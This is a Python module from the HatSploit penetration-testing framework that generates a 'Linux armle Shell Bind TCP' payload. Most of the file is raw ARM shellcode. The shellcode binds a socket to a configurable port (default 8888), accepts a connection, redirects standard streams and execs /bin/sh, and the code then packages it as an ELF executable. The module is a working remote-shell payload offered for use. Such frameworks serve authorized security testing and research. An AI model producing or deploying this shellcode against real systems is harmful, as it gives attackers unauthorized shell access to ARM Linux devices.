#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import HatSploitPayload

from utils.payload.payload_generator import payload_generator

class HatSploitPayload(HatSploitPayload):
    payload_generator = payload_generator()

    details = {
        'Name': "Linux armle Shell Bind TCP",
        'Payload': "linux/armle/shell_bind_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Shell Bind TCP Payload for Linux armle."
    }

    options = {
        'BPORT': {
            'Description': "Bind port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FORMAT': {
            'Description': "Executable format.",
            'Value': "elf",
            'Type': None,
            'Required': True
        }
    }

    def generate(self):
        bind_port, executable_format = self.parser.parse_options(self.options)
        bind_port = self.payload_generator.port_to_bytes(bind_port)

        if not executable_format in self.payload_generator.formats.keys():
            self.badges.output_error("Invalid executable format!")
            return

        self.badges.output_process("Generating shellcode...")
        shellcode = (
            b"\x02\x00\xa0\xe3" +
            b"\x01\x10\xa0\xe3" +
            b"\x06\x20\xa0\xe3" +
            b"\x07\x00\x2d\xe9" +
            b"\x01\x00\xa0\xe3" +
            b"\x0d\x10\xa0\xe1" +
            b"\x66\x00\x90\xef" +
            b"\x0c\xd0\x8d\xe2" +
            b"\x00\x60\xa0\xe1" +
            bind_port[1:2] + b"\x10\xa0\xe3" +
            bind_port[0:1] + b"\x70\xa0\xe3" +
            b"\x01\x1c\xa0\xe1" +
            b"\x07\x18\x81\xe0" +
            b"\x02\x10\x81\xe2" +
            b"\x02\x20\x42\xe0" +
            b"\x06\x00\x2d\xe9" +
            b"\x0d\x10\xa0\xe1" +
            b"\x10\x20\xa0\xe3" +
            b"\x07\x00\x2d\xe9" +
            b"\x02\x00\xa0\xe3" +
            b"\x0d\x10\xa0\xe1" +
            b"\x66\x00\x90\xef" +
            b"\x14\xd0\x8d\xe2" +
            b"\x06\x00\xa0\xe1" +
            b"\x03\x00\x2d\xe9" +
            b"\x04\x00\xa0\xe3" +
            b"\x0d\x10\xa0\xe1" +
            b"\x66\x00\x90\xef" +
            b"\x08\xd0\x8d\xe2" +
            b"\x06\x00\xa0\xe1" +
            b"\x01\x10\x41\xe0" +
            b"\x02\x20\x42\xe0" +
            b"\x07\x00\x2d\xe9" +
            b"\x05\x00\xa0\xe3" +
            b"\x0d\x10\xa0\xe1" +
            b"\x66\x00\x90\xef" +
            b"\x0c\xd0\x8d\xe2" +
            b"\x00\x60\xa0\xe1" +
            b"\x02\x10\xa0\xe3" +
            b"\x06\x00\xa0\xe1" +
            b"\x3f\x00\x90\xef" +
            b"\x01\x10\x51\xe2" +
            b"\xfb\xff\xff\x5a" +
            b"\x04\x10\x4d\xe2" +
            b"\x02\x20\x42\xe0" +
            b"\x2f\x30\xa0\xe3" +
            b"\x62\x70\xa0\xe3" +
            b"\x07\x34\x83\xe0" +
            b"\x69\x70\xa0\xe3" +
            b"\x07\x38\x83\xe0" +
            b"\x6e\x70\xa0\xe3" +
            b"\x07\x3c\x83\xe0" +
            b"\x2f\x40\xa0\xe3" +
            b"\x73\x70\xa0\xe3" +
            b"\x07\x44\x84\xe0" +
            b"\x68\x70\xa0\xe3" +
            b"\x07\x48\x84\xe0" +
            b"\x73\x50\xa0\xe3" +
            b"\x68\x70\xa0\xe3" +
            b"\x07\x54\x85\xe0" +
            b"\x3e\x00\x2d\xe9" +
            b"\x08\x00\x8d\xe2" +
            b"\x00\x10\x8d\xe2" +
            b"\x04\x20\x8d\xe2" +
            b"\x0b\x00\x90\xef"
        )

        self.badges.output_process("Generating payload...")
        payload = self.payload_generator.generate(executable_format, 'armle', shellcode)

        return payload